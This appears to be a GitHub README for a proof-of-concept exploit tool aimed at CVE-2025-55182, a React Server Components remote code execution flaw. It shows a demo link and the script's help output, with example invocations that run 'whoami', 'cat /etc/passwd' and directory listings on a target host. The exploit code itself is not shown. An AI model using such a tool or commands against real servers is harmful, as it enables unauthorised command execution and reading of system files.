# ⚡ react2shellpoc

> 🚨 **Educational Proof of Concept – Handle With Care**

**react2shellpoc** is a proof-of-concept project demonstrating how a **React-based frontend** can be abused to trigger **system-level shell command execution** under insecure configurations.

This project focuses on:
- 🔗 React UI → OS command execution flows  
- 🧱 Broken trust boundaries in modern web stacks  
- ⚠️ Real-world security risks caused by misconfiguration  

---

## 🎥 Video PoC

<p align="center">
  <img src="[https://private-user-images.githubusercontent.com/158517938/523478299-d1d86d72-39cb-4af8-9dca-611a0cad9ef7.gif?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjY3OTIyMTksIm5iZiI6MTc2Njc5MTkxOSwicGF0aCI6Ii8xNTg1MTc5MzgvNTIzNDc4Mjk5LWQxZDg2ZDcyLTM5Y2ItNGFmOC05ZGNhLTYxMWEwY2FkOWVmNy5naWY_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUxMjI2JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MTIyNlQyMzMxNTlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kNTlhNzUxYmI0YmI3YzJlZGFmYTQ1MTliZGZlNzgyZDJhMWVkZTE5ODQ2ZGYyOTE3ZGVlNmI1NjcyNmYwNGE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.PJVZ74RqlMMZgYgHkn1VEde8hyjEsiyTBM3fBI8Fk9I)" alt="react2shellpoc demo" />
</p>

---

## 💻 Proof of Concept (CLI View)

```bash
┌──(kali㉿kali)-[~/Documents/tools/2025-55182]
└─$ python exploit.py -h

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

usage: exploit.py [-h] [-t URL] [-c CMD]

options:
  -h, --help         show this help message and exit
  -t, --target URL   Target URL or domain (default: http://hacx.me)
  -c, --command CMD  Command to execute on target (default: id)

Examples:
  exploit.py -t hacx.me -c "whoami"
  exploit.py -t http://hacx.me -c "cat /etc/passwd"
  exploit.py -t hacx.me -c "ls -la /var/www"
